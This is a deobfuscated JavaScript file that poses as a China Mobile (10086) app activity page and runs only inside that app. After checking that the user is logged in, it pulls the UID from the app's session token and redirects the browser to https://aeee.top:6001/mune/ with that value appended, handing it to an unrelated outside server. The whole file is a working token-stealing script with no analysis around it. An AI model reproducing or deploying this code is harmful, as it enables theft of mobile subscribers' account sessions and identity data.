//Tue Nov 05 2024 05:52:57 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
function getContextPath() {
  var _0x14bb89 = document.location.pathname,
    _0x4888fd = _0x14bb89.substr(1).indexOf("/"),
    _0x328c4f = _0x14bb89.substr(0, _0x4888fd + 1);
  return _0x328c4f;
}
var actUrl = "https://wx.10086.cn/",
  debug = false;
if (navigator.userAgent.indexOf("leadeon") < 0) {
  window.location.href = "https://app.10086.cn/activity/transit/transferDownload.html";
} else leadeon.userStatus({
  "debug": debug,
  "success": function (_0x477c08) {
    var _0x8ed251 = _0x477c08.status,
      _0x153efd = _0x477c08.otherStatus;
    0 == _0x8ed251 && 0 == _0x153efd ? leadeon.showLogin({
      "debug": debug,
      "success": function (_0x1949e9) {},
      "error": function (_0x8bedeb) {
        alert("无法拉起登录框，请手动登录~");
      }
    }) : leadeon.checkSessionIsvalid({
      "success": function (_0xf66c47) {
        var _0x5aafd1 = _0xf66c47.status;
        if (_0x5aafd1 == 1) {
          leadeon.getUserInfo({
            "debug": debug,
            "success": function (_0x5efce7) {
              var _0x440e2a = _0x5efce7.token.match(/UID=(\w+);/)[1];
              window.location.href = "https://aeee.top:6001/mune/" + _0x440e2a;
            },
            "error": function (_0x396fd4) {
              alert("未获取到APP登录信息,请重新登录APP后操作~");
            }
          });
        } else leadeon.overTime();
      }
    });
  },
  "error": function (_0x548da2) {
    alert("未检测到APP登录信息,请重新登录APP后操作~");
  }
});